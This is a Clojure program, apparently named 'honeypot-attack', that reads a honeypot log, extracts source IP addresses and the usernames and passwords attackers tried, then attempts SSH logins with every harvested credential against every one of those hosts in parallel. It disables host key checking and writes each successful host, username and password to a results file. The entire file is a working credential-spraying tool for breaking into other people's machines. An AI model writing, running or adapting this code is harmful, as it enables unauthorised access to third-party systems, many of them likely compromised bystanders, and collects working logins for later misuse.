(ns honeypot-attack.core
  (:gen-class)
  (:require [clojure.string :as str])
  (:import [com.jcraft.jsch JSch JSchException]))

(defn process-line [line results]
  (let [cursory-match (re-find #"] \d+\.\d+\.\d+\.\d+ .* .*$" line)]
    (if (nil? cursory-match) results
        (let [split (str/split cursory-match #" ")]
          (if (< (count split) 4) results
              (let  [hostname (nth split 1)
                     username (nth split 2)
                     password (nth split 3)]
                [(assoc (nth results 0) (keyword hostname) 1) (conj (nth results 1) [username password])]))))))

(defn read-input [filename]
  (filter (fn [x] (not (nil? x))) (let [data (slurp filename)]
                                    (let [lines (str/split data #"\n")]
                                      (let [length (count lines)]
                                        ((fn [start end results]
                                           (if (>= start end)
                                             results
                                             (recur (+ 1 start) end (process-line (nth lines start) results)))) 0 length [{} []]))))))

(defn make-ssh-connection [host credential]
  (do (println "making attempt " host credential)
      (try
        (let [username (nth credential 0)
              password (nth credential 1)
              jsch (JSch.)
              session (.getSession jsch username host 22)]
          (.setPassword session password)
          (.setConfig session "StrictHostKeyChecking" "no")
          (.connect session)
          (.disconnect session)
          [host username password])
        (catch Exception ex
          nil))))

(defn attack [host credentials]
  (flatten
   (filter (fn [x] (not (nil? x))) (pmap (fn [credential] (make-ssh-connection host credential)) credentials))))

(defn -main
  "I don't do a whole lot ... yet."
  [& args]

  (if
   (= (count args) 0)
    (println "Pass a filename.")
    (let [input (read-input (nth args 0))]
      (let [hosts-to-attack (nth input 0)
            credentials (nth input 1)]
        (let [results (pmap (fn [host] (attack (name host) credentials)) (keys hosts-to-attack))]
          (do
            (doseq [x results]
              (spit "results" (str (str/join " " x) "\n") :append true))
            (shutdown-agents)))))))
